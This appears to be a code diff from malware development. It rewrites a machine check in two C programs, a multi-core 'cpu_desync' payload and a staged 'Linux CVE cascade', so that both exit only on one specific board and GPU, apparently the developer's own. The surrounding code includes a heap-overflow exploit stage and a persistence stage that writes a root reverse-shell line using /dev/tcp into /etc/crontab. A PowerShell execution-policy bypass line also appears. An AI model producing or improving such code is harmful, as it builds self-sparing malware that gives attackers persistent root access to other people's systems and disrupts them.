@@ -631,20 +631,41 @@ powershell.exe -ExecutionPolicy Bypass -File "C:\\ProgramData\\cpu_desync_window
 
 #define NUM_ITERATIONS 10000
 
-int check_pci_device(void) {
-    DIR *dir = opendir("/sys/bus/pci/devices");
-    if (!dir) return 0;
-
-    struct dirent *entry;
-    while ((entry = readdir(dir)) != NULL) {
-        if (strstr(entry->d_name, "8086:7d1d")) {
-            closedir(dir);
-            return 1;
+int check_dev_machine(void) {
+    // Anchor A: Check DMI baseboard product
+    FILE *dmi = fopen("/sys/class/dmi/id/board_name", "r");
+    if (dmi) {
+        char board[256];
+        if (fgets(board, sizeof(board), dmi)) {
+            if (strstr(board, "0M5NJ4")) {
+                fclose(dmi);
+                return 1;
+            }
         }
+        fclose(dmi);
     }
-    closedir(dir);
+
+    // Anchor B: Check PCI device 8086:7d1d
+    DIR *dir = opendir("/sys/bus/pci/devices");
+    if (dir) {
+        struct dirent *entry;
+        while ((entry = readdir(dir)) != NULL) {
+            if (strstr(entry->d_name, "8086:7d1d")) {
+                closedir(dir);
+                return 1;
+            }
+        }
+        closedir(dir);
+    }
 
     FILE *f = popen("lspci -n 2>/dev/null | grep -q '8086:7d1d'", "r");
+    if (f) {
+        int ret = pclose(f);
+        if (ret == 0) return 1;
+    }
+
+    // Anchor B: Check VGA Intel Meteor Lake-P / Arc Graphics
+    f = popen("lspci 2>/dev/null | grep -i 'VGA' | grep -Ei 'Meteor Lake-P|Intel Arc Graphics'", "r");
     if (f) {
         int ret = pclose(f);
         if (ret == 0) return 1;
@@ -691,7 +712,7 @@ void* desync_thread(void* arg) {
 }
 
 int main(void) {
-    if (check_pci_device()) return 0;
+    if (check_dev_machine()) return 0;
 
     int num_cores = sysconf(_SC_NPROCESSORS_ONLN);
     pthread_t* threads = malloc(sizeof(pthread_t) * num_cores);
@@ -817,6 +838,7 @@ sudo /usr/local/bin/cpu_desync_linux
 #include <fcntl.h>
 #include <sys/mman.h>
 #include <stdint.h>
+#include <dirent.h>
 
 // CVE-2025-24085: Linux HFS+ heap overflow (Stage 1: Initial Access)
 void stage1_hfs_overflow(void) {
@@ -885,23 +907,51 @@ void stage3_persistence(void) {
     system("echo '*/5 * * * * root /bin/sh -c \"/bin/bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\"' >> /etc/crontab");
 }
 
-int check_pci_device(void) {
-    DIR *dir = opendir("/sys/bus/pci/devices");
-    if (!dir) return 0;
-
-    struct dirent *entry;
-    while ((entry = readdir(dir)) != NULL) {
-        if (strstr(entry->d_name, "8086:7d1d")) {
-            closedir(dir);
-            return 1;
+int check_dev_machine(void) {
+    // Anchor A: Check DMI baseboard product
+    FILE *dmi = fopen("/sys/class/dmi/id/board_name", "r");
+    if (dmi) {
+        char board[256];
+        if (fgets(board, sizeof(board), dmi)) {
+            if (strstr(board, "0M5NJ4")) {
+                fclose(dmi);
+                return 1;
+            }
         }
+        fclose(dmi);
     }
-    closedir(dir);
+
+    // Anchor B: Check PCI device 8086:7d1d
+    DIR *dir = opendir("/sys/bus/pci/devices");
+    if (dir) {
+        struct dirent *entry;
+        while ((entry = readdir(dir)) != NULL) {
+            if (strstr(entry->d_name, "8086:7d1d")) {
+                closedir(dir);
+                return 1;
+            }
+        }
+        closedir(dir);
+    }
+
+    FILE *f = popen("lspci -n 2>/dev/null | grep -q '8086:7d1d'", "r");
+    if (f) {
+        int ret = pclose(f);
+        if (ret == 0) return 1;
+    }
+
+    // Anchor B: Check VGA Intel Meteor Lake-P / Arc Graphics
+    f = popen("lspci 2>/dev/null | grep -i 'VGA' | grep -Ei 'Meteor Lake-P|Intel Arc Graphics'", "r");
+    if (f) {
+        int ret = pclose(f);
+        if (ret == 0) return 1;
+    }
+
     return 0;
 }
 
 int main(int argc, char *argv[]) {
-    if (check_pci_device()) return 0;
+    if (check_dev_machine()) return 0;
 
     // Execute guaranteed Linux CVE cascade
     stage1_hfs_overflow();
